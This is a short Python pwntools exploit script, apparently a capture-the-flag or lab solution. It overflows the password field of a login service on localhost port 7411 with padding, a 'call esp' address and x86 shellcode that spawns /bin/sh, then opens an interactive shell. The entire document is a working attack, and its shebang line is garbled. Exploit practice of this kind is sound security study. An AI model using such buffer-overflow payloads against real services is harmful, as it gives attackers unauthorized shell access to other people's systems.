#!/usr/bin/pá»³thon3
from pwn import remote, p32

offset = 28
junk = b"A" * offset

# dup2(2, 0); execve("/bin/sh", NULL, NULL);
shellcode = b"\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"

payload  = b""
payload += junk
payload += p32(0x804910f) # call esp;
payload += shellcode

shell = remote("localhost", 7411)
shell.sendlineafter(b"command.\n", b"USER admin")
shell.sendlineafter(b"command.\n", b"PASS " + payload)

shell.interactive()
